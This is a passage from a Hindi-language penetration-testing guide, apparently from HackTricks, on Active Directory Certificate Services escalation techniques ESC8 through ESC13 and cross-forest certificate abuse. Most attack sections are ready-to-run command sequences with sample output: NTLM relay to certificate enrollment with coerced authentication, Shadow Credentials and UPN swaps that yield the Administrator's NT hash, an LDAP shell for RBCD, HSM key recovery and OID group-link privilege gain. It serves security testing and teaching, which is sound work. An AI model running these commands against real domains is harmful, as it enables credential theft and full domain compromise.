- **वेब नामांकन इंटरफेस** (एक पुरानी ASP एप्लिकेशन जो `http://<caserver>/certsrv/` पर उपलब्ध है), डिफ़ॉल्ट रूप से केवल HTTP पर सेट है, जो NTLM रिले हमलों के खिलाफ सुरक्षा प्रदान नहीं करता है। इसके अतिरिक्त, यह स्पष्ट रूप से केवल NTLM प्रमाणीकरण की अनुमति देता है अपने Authorization HTTP हेडर के माध्यम से, जिससे अधिक सुरक्षित प्रमाणीकरण विधियाँ जैसे Kerberos अनुपयुक्त हो जाती हैं।
- **प्रमाण पत्र नामांकन सेवा** (CES), **प्रमाण पत्र नामांकन नीति** (CEP) वेब सेवा, और **नेटवर्क डिवाइस नामांकन सेवा** (NDES) डिफ़ॉल्ट रूप से अपने Authorization HTTP हेडर के माध्यम से बातचीत प्रमाणीकरण का समर्थन करते हैं। बातचीत प्रमाणीकरण **दोनों** Kerberos और **NTLM** का समर्थन करता है, जिससे एक हमलावर **NTLM** प्रमाणीकरण के लिए डाउनग्रेड कर सकता है। हालाँकि ये वेब सेवाएँ डिफ़ॉल्ट रूप से HTTPS सक्षम करती हैं, HTTPS अकेले **NTLM रिले हमलों के खिलाफ सुरक्षा नहीं करता है**। HTTPS सेवाओं के लिए NTLM रिले हमलों से सुरक्षा केवल तब संभव है जब HTTPS को चैनल बाइंडिंग के साथ जोड़ा जाए। दुर्भाग्यवश, AD CS IIS पर प्रमाणीकरण के लिए विस्तारित सुरक्षा को सक्रिय नहीं करता है, जो चैनल बाइंडिंग के लिए आवश्यक है।

NTLM रिले हमलों के साथ एक सामान्य **समस्या** NTLM सत्रों की **संक्षिप्त अवधि** और हमलावर की उन सेवाओं के साथ बातचीत करने में असमर्थता है जो **NTLM साइनिंग** की आवश्यकता होती है।

फिर भी, इस सीमा को एक NTLM रिले हमले का लाभ उठाकर उपयोगकर्ता के लिए एक प्रमाण पत्र प्राप्त करके पार किया जाता है, क्योंकि प्रमाण पत्र की वैधता अवधि सत्र की अवधि को निर्धारित करती है, और प्रमाण पत्र को उन सेवाओं के साथ उपयोग किया जा सकता है जो **NTLM साइनिंग** की आवश्यकता होती है। चोरी किए गए प्रमाण पत्र का उपयोग करने के लिए निर्देशों के लिए, देखें:

{{#ref}}
account-persistence.md
{{#endref}}

NTLM रिले हमलों की एक और सीमा यह है कि **एक हमलावर-नियंत्रित मशीन को एक पीड़ित खाते द्वारा प्रमाणीकरण किया जाना चाहिए**। हमलावर या तो इंतजार कर सकता है या इस प्रमाणीकरण को **बलात्कृत** करने का प्रयास कर सकता है:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` प्रॉपर्टी का उपयोग एंटरप्राइज सर्टिफिकेट ऑथोरिटीज़ (CAs) द्वारा सर्टिफिकेट एनरोलमेंट सर्विस (CES) एंडपॉइंट्स को स्टोर करने के लिए किया जाता है। इन एंडपॉइंट्स को **Certutil.exe** टूल का उपयोग करके पार्स और लिस्ट किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify के साथ दुरुपयोग
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

सर्टिफिकेट के लिए अनुरोध Certipy द्वारा डिफ़ॉल्ट रूप से `Machine` या `User` टेम्पलेट के आधार पर किया जाता है, जो इस पर निर्भर करता है कि क्या रिले किया जा रहा खाता नाम `$` पर समाप्त होता है। एक वैकल्पिक टेम्पलेट का निर्दिष्ट करना `-template` पैरामीटर का उपयोग करके किया जा सकता है।

एक तकनीक जैसे [PetitPotam](https://github.com/ly4k/PetitPotam) का उपयोग फिर प्रमाणीकरण को मजबूर करने के लिए किया जा सकता है। डोमेन नियंत्रकों के साथ काम करते समय, `-template DomainController` का निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

नया मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) के लिए **`msPKI-Enrollment-Flag`**, जिसे ESC9 के रूप में संदर्भित किया जाता है, एक प्रमाणपत्र में **नए `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा विस्तार** को एम्बेड करने से रोकता है। यह ध्वज तब प्रासंगिक हो जाता है जब `StrongCertificateBindingEnforcement` को `1` (डिफ़ॉल्ट सेटिंग) पर सेट किया जाता है, जो `2` के सेटिंग के विपरीत है। इसकी प्रासंगिकता उन परिदृश्यों में बढ़ जाती है जहां Kerberos या Schannel के लिए एक कमजोर प्रमाणपत्र मैपिंग का शोषण किया जा सकता है (जैसे ESC10 में), यह देखते हुए कि ESC9 की अनुपस्थिति आवश्यकताओं को नहीं बदलेगी।

इस ध्वज के सेटिंग के महत्वपूर्ण होने की शर्तें शामिल हैं:

- `StrongCertificateBindingEnforcement` को `2` पर समायोजित नहीं किया गया है (डिफ़ॉल्ट `1` है), या `CertificateMappingMethods` में `UPN` ध्वज शामिल है।
- प्रमाणपत्र को `msPKI-Enrollment-Flag` सेटिंग के भीतर `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज के साथ चिह्नित किया गया है।
- प्रमाणपत्र द्वारा किसी भी क्लाइंट प्रमाणीकरण EKU को निर्दिष्ट किया गया है।
- किसी भी खाते पर `GenericWrite` अनुमतियाँ उपलब्ध हैं ताकि किसी अन्य को समझौता किया जा सके।

### Abuse Scenario

मान लीजिए `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` अनुमतियाँ हैं, जिसका लक्ष्य `Administrator@corp.local` को समझौता करना है। `ESC9` प्रमाणपत्र टेम्पलेट, जिसमें `Jane@corp.local` को नामांकित करने की अनुमति है, को इसके `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज के साथ कॉन्फ़िगर किया गया है।

शुरुआत में, `Jane` का हैश Shadow Credentials का उपयोग करके प्राप्त किया जाता है, धन्यवाद `John` के `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में संशोधित किया जाता है, जानबूझकर `@corp.local` डोमेन भाग को छोड़ दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन प्रतिबंधों का उल्लंघन नहीं करता है, यह देखते हुए कि `Administrator@corp.local` `Administrator` के `userPrincipalName` के रूप में अलग बना रहता है।

इसके बाद, `ESC9` प्रमाणपत्र टेम्पलेट, जिसे कमजोर माना गया है, को `Jane` के रूप में अनुरोध किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
यह नोट किया गया है कि प्रमाणपत्र का `userPrincipalName` `Administrator` को दर्शाता है, जिसमें कोई “object SID” नहीं है।

`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` में बदल दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
जारी किए गए प्रमाणपत्र के साथ प्रमाणीकरण करने का प्रयास अब `Administrator@corp.local` का NT हैश देता है। कमांड में `-domain <domain>` शामिल होना चाहिए क्योंकि प्रमाणपत्र में डोमेन निर्दिष्ट नहीं है:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## कमजोर प्रमाणपत्र मैपिंग - ESC10

### व्याख्या

डोमेन नियंत्रक पर दो रजिस्ट्री कुंजी मान ESC10 द्वारा संदर्भित हैं:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के तहत `CertificateMappingMethods` के लिए डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`) है, जिसे पहले `0x1F` पर सेट किया गया था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के तहत `StrongCertificateBindingEnforcement` के लिए डिफ़ॉल्ट सेटिंग `1` है, पहले `0`।

**मामला 1**

जब `StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर किया गया है।

**मामला 2**

यदि `CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है।

### दुरुपयोग मामला 1

जब `StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर किया गया है, तो `GenericWrite` अनुमतियों के साथ एक खाता A का उपयोग किसी भी खाते B को समझौता करने के लिए किया जा सकता है।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` अनुमतियों के साथ, एक हमलावर `Administrator@corp.local` को समझौता करने का लक्ष्य रखता है। यह प्रक्रिया ESC9 को दर्शाती है, जिससे किसी भी प्रमाणपत्र टेम्पलेट का उपयोग किया जा सकता है।

शुरुआत में, `Jane` का हैश Shadow Credentials का उपयोग करके प्राप्त किया जाता है, `GenericWrite` का दुरुपयोग करते हुए।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में बदल दिया जाता है, जानबूझकर `@corp.local` भाग को छोड़ दिया जाता है ताकि एक बाधा उल्लंघन से बचा जा सके।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
इसके बाद, `Jane` के रूप में क्लाइंट प्रमाणीकरण सक्षम करने वाला एक प्रमाणपत्र अनुरोध किया जाता है, जो डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` पर वापस लाया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्राप्त किए गए प्रमाणपत्र के साथ प्रमाणीकरण करने से `Administrator@corp.local` का NT हैश प्राप्त होगा, जो प्रमाणपत्र में डोमेन विवरण की अनुपस्थिति के कारण कमांड में डोमेन को निर्दिष्ट करने की आवश्यकता को दर्शाता है।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` में `UPN` बिट फ्लैग (`0x4`) होने के साथ, एक खाता A जिसके पास `GenericWrite` अनुमतियाँ हैं, किसी भी खाता B को समझौता कर सकता है जिसमें `userPrincipalName` प्रॉपर्टी नहीं है, जिसमें मशीन खाते और अंतर्निहित डोमेन प्रशासक `Administrator` शामिल हैं।

यहाँ, लक्ष्य `DC$@corp.local` को समझौता करना है, `Jane` के हैश को Shadow Credentials के माध्यम से प्राप्त करने के साथ, `GenericWrite` का लाभ उठाते हुए।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
एक प्रमाणपत्र क्लाइंट प्रमाणीकरण के लिए `Jane` के रूप में डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करते हुए अनुरोध किया गया है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपने मूल पर वापस आ जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel के माध्यम से प्रमाणीकरण करने के लिए, Certipy का `-ldap-shell` विकल्प उपयोग किया जाता है, जो प्रमाणीकरण की सफलता को `u:CORP\DC$` के रूप में दर्शाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP शेल के माध्यम से, `set_rbcd` जैसे कमांड रिसोर्स-आधारित सीमित प्रतिनिधित्व (RBCD) हमलों को सक्षम करते हैं, जो संभावित रूप से डोमेन नियंत्रक को खतरे में डाल सकते हैं।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
यह कमजोरियां किसी भी उपयोगकर्ता खाते पर लागू होती हैं जिसमें `userPrincipalName` नहीं है या जहां यह `sAMAccountName` से मेल नहीं खाता, जिसमें डिफ़ॉल्ट `Administrator@corp.local` एक प्रमुख लक्ष्य है क्योंकि इसके पास उच्च LDAP विशेषाधिकार हैं और डिफ़ॉल्ट रूप से `userPrincipalName` की अनुपस्थिति है।

## NTLM को ICPR में रिले करना - ESC11

### व्याख्या

यदि CA सर्वर को `IF_ENFORCEENCRYPTICERTREQUEST` के साथ कॉन्फ़िगर नहीं किया गया है, तो यह RPC सेवा के माध्यम से साइन किए बिना NTLM रिले हमलों को सक्षम कर सकता है। [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)।

आप यह देखने के लिए `certipy` का उपयोग कर सकते हैं कि क्या `Enforce Encryption for Requests` अक्षम है और certipy `ESC11` कमजोरियों को दिखाएगा।
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

एक रिले सर्वर सेटअप करना आवश्यक है:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
नोट: डोमेन कंट्रोलर्स के लिए, हमें DomainController में `-template` निर्दिष्ट करना होगा।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करते हुए:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

प्रशासक Certificate Authority को "Yubico YubiHSM2" जैसे बाहरी उपकरण पर स्टोर करने के लिए सेट कर सकते हैं।

यदि USB उपकरण CA सर्वर से USB पोर्ट के माध्यम से जुड़ा है, या यदि CA सर्वर एक वर्चुअल मशीन है तो USB उपकरण सर्वर पर, Key Storage Provider द्वारा YubiHSM में कुंजी उत्पन्न करने और उपयोग करने के लिए एक प्रमाणीकरण कुंजी (जिसे कभी-कभी "पासवर्ड" कहा जाता है) की आवश्यकता होती है।

यह कुंजी/पासवर्ड रजिस्ट्री में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` के तहत स्पष्ट पाठ में संग्रहीत होती है।

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

यदि CA की निजी कुंजी एक भौतिक USB उपकरण पर संग्रहीत है जब आपको शेल एक्सेस मिला, तो कुंजी को पुनर्प्राप्त करना संभव है।

पहले, आपको CA प्रमाणपत्र प्राप्त करना होगा (यह सार्वजनिक है) और फिर:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
अंत में, certutil `-sign` कमांड का उपयोग करके CA प्रमाणपत्र और इसके निजी कुंजी का उपयोग करके एक नया मनमाना प्रमाणपत्र तैयार करें।

## OID समूह लिंक दुरुपयोग - ESC13

### व्याख्या

`msPKI-Certificate-Policy` विशेषता प्रमाणपत्र टेम्पलेट में जारी करने की नीति को जोड़ने की अनुमति देती है। `msPKI-Enterprise-Oid` वस्तुएं जो नीतियों को जारी करने के लिए जिम्मेदार हैं, उन्हें PKI OID कंटेनर के कॉन्फ़िगरेशन नामांकन संदर्भ (CN=OID,CN=Public Key Services,CN=Services) में खोजा जा सकता है। एक नीति को इस वस्तु के `msDS-OIDToGroupLink` विशेषता का उपयोग करके एक AD समूह से जोड़ा जा सकता है, जिससे एक प्रणाली को उस उपयोगकर्ता को अधिकृत करने की अनुमति मिलती है जो प्रमाणपत्र प्रस्तुत करता है जैसे कि वह समूह का सदस्य हो। [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

दूसरे शब्दों में, जब एक उपयोगकर्ता को एक प्रमाणपत्र में नामांकित करने की अनुमति होती है और प्रमाणपत्र एक OID समूह से जुड़ा होता है, तो उपयोगकर्ता इस समूह के विशेषाधिकारों को विरासत में ले सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

एक उपयोगकर्ता अनुमति खोजें जिसे `certipy find` या `Certify.exe find /showAllPermissions` का उपयोग किया जा सके।

यदि `John` को `VulnerableTemplate` में नामांकित करने की अनुमति है, तो उपयोगकर्ता `VulnerableGroup` समूह के विशेषाधिकारों को विरासत में ले सकता है।

उसे केवल टेम्पलेट निर्दिष्ट करने की आवश्यकता है, उसे OIDToGroupLink अधिकारों के साथ एक प्रमाणपत्र प्राप्त होगा।
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## प्रमाणपत्रों के साथ जंगलों का समझौता निष्क्रिय वॉयस में समझाया गया

### समझौता किए गए CAs द्वारा जंगलों के विश्वास का टूटना

**क्रॉस-फॉरेस्ट नामांकन** के लिए कॉन्फ़िगरेशन को अपेक्षाकृत सरल बनाया गया है। **रूट CA प्रमाणपत्र** को संसाधन जंगल से **खाता जंगलों** में प्रशासकों द्वारा **प्रकाशित** किया जाता है, और संसाधन जंगल से **एंटरप्राइज CA** प्रमाणपत्रों को **प्रत्येक खाता जंगल में `NTAuthCertificates` और AIA कंटेनरों में जोड़ा** जाता है। स्पष्ट करने के लिए, यह व्यवस्था **संसाधन जंगल में CA को सभी अन्य जंगलों पर पूर्ण नियंत्रण** प्रदान करती है जिनका वह PKI प्रबंधित करता है। यदि इस CA को **हमलावरों द्वारा समझौता** किया जाता है, तो संसाधन और खाता जंगलों में सभी उपयोगकर्ताओं के लिए प्रमाणपत्रों को **उनके द्वारा जाली** किया जा सकता है, जिससे जंगल की सुरक्षा सीमा टूट जाती है।

### विदेशी प्रिंसिपलों को दिए गए नामांकन विशेषाधिकार

मल्टी-फॉरेस्ट वातावरण में, एंटरप्राइज CAs के संबंध में सावधानी बरतने की आवश्यकता है जो **प्रमाणपत्र टेम्पलेट्स** प्रकाशित करते हैं जो **प्रमाणित उपयोगकर्ताओं या विदेशी प्रिंसिपलों** (जिन्हें एंटरप्राइज CA से संबंधित जंगल के बाहर के उपयोगकर्ता/समूह) **नामांकन और संपादन अधिकार** प्रदान करते हैं।\
एक विश्वास के पार प्रमाणीकरण के बाद, **प्रमाणित उपयोगकर्ताओं का SID** AD द्वारा उपयोगकर्ता के टोकन में जोड़ा जाता है। इसलिए, यदि एक डोमेन में एक एंटरप्राइज CA है जिसमें एक टेम्पलेट है जो **प्रमाणित उपयोगकर्ताओं को नामांकन अधिकार** प्रदान करता है, तो एक उपयोगकर्ता **एक अलग जंगल से टेम्पलेट में नामांकित** हो सकता है। इसी तरह, यदि **एक टेम्पलेट द्वारा एक विदेशी प्रिंसिपल को स्पष्ट रूप से नामांकन अधिकार प्रदान किए जाते हैं**, तो **एक क्रॉस-फॉरेस्ट एक्सेस-कंट्रोल संबंध इस प्रकार बनाया जाता है**, जिससे एक जंगल से एक प्रिंसिपल को **दूसरे जंगल के टेम्पलेट में नामांकित** करने की अनुमति मिलती है।

दोनों परिदृश्यों से एक जंगल से दूसरे जंगल में **हमले की सतह में वृद्धि** होती है। प्रमाणपत्र टेम्पलेट की सेटिंग्स का उपयोग एक हमलावर द्वारा एक विदेशी डोमेन में अतिरिक्त विशेषाधिकार प्राप्त करने के लिए किया जा सकता है।


{{#include ../../../banners/hacktricks-training.md}}
